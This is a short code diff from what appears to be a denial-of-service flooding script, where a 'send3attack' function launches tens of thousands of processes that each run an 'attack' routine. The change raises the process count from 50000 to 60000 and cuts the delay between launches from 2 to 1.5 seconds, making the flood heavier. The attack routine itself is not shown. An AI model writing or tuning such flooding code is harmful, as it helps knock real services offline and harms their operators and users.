@@ -97,12 +97,12 @@ for i in progressbar(range(30), "Loading: ", 40):
  
 
 def send3attack():
-  for i in range(50000): #Poder mágico
+  for i in range(60000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
-    sleep(2)
+    sleep(1.5)
 	
 send3attack()
 exit(0)
